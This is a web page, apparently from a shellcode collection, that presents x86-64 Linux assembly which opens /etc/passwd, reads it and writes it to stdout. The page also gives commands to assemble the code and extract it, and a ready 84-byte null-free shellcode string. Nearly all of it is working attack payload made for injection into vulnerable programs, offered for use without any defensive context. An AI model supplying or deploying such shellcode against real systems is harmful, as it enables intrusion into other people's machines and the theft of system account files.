---
layout: default
title: read("/etc/passwd"); write(stdout) - Read /etc/passwd and write contents to stdout
permalink: /shellcode/asm-12.html
os: Linux
arch: Intel x86-64
length: 84
---

# {{ page.title }}

---
**OS:** {{ page.os }}

**Architecture:** {{ page.arch }}

**Length:** {{ page.length }} bytes

---

## Assembly

```nasm
section .text
global _start


_start:
	xor rbx, rbx			; null rbx (0)
	mul rbx				; rax, rbx, rdx = 0
	xor rdi, rdi			; null rdi (0)

	push rbx			; push null terminator
	mov rbx, 0x6477737361702f2f	; move "//passwd" into rbx
	push rbx			; push "//passwd"
	mov rbx, 0x2f2f6374652f2f2f	; move "///etc//" into rbx
	push rbx			; push "///etc//"

	lea rdi, [rsp]			; copy pointer to string into rdi

	xor rsi, rsi			; null rsi (0)
	mov al, 0x02			; move open syscall number into al (rax)
	syscall				; call open

	mov rsi, rdi			; move pointer to "///etc//passwd" from rdi into rsi
	mov rdi, rax			; move file-descriptor from rax into rdi
	xor rax, rax			; null rax (0)
	mov dx, 0xfff			; move 0xfff (4095) into dx (rdx)
	syscall				; call read

	xchg rdx, rax			; exchange rdx, rax
	xor rax, rax			; null rax (0)
	inc rax				; increment rax = 1
	xor rdi, rdi			; null rdi (0)
	inc rdi				; increment rdi (1)
	syscall				; call write

	xor rdi, rdi			; null rdi (0)
	xor rax, rax			; null rax (0)
	mov al, 0x3c			; move exit syscall number into al (rax)
	syscall				; call exit
```

## Compilation and Linking

```bash
# Assemble
nasm -f elf64 -o code.o code.asm

# Link
ld -m elf_x86_64 -s -o code code.o

# Extract Shellcode
printf '\\x' && objdump -d code | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

## Shellcode

```
\x48\x31\xdb\x48\xf7\xe3\x48\x31\xff\x53\x48\xbb\x2f\x2f\x70\x61\x73\x73\x77\x64\x53\x48\xbb\x2f\x2f\x2f\x65\x74\x63\x2f\x2f\x53\x48\x8d\x3c\x24\x48\x31\xf6\xb0\x02\x0f\x05\x48\x89\xfe\x48\x89\xc7\x48\x31\xc0\x66\xba\xff\x0f\x0f\x05\x48\x92\x48\x31\xc0\x48\xff\xc0\x48\x31\xff\x48\xff\xc7\x0f\x05\x48\x31\xff\x48\x31\xc0\xb0\x3c\x0f\x05
```